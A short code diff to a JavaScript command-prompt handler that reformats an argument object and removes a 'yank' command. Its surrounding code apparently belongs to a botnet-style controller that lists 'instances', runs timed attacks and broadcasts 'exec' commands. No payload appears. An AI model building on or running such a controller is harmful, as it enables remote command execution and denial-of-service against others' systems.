@@ -15,11 +15,11 @@ export function prompt() {
 
 		// Commands
 		const commandArgs = {
-			"firstArg": message.split(" ")[1],
-			"secondArg": message.split(" ")[2],
-			"thirdArg": message.split(" ")[3],
-			"fourthArg": message.split(" ")[4]
-		}
+			firstArg: message.split(" ")[1],
+			secondArg: message.split(" ")[2],
+			thirdArg: message.split(" ")[3],
+			fourthArg: message.split(" ")[4],
+		};
 
 		if (message.startsWith("instances")) {
 			if (message === "instances") {
@@ -99,16 +99,6 @@ export function prompt() {
 			setTimeout(() => {
 				console.log("Attack completed!");
 			}, duration);
-		}
-
-		if (message.startsWith("yank")) {
-			if (message === "yank") console.log("Pease provide arguments:")
-
-			if (commandArgs.firstArg !== undefined) {
-				recieve(commandArgs.firstArg, commandArgs.secondArg);
-				broadcast(message);
-			}
-
 		}
 
 		if (message.startsWith("exec")) broadcast(message);
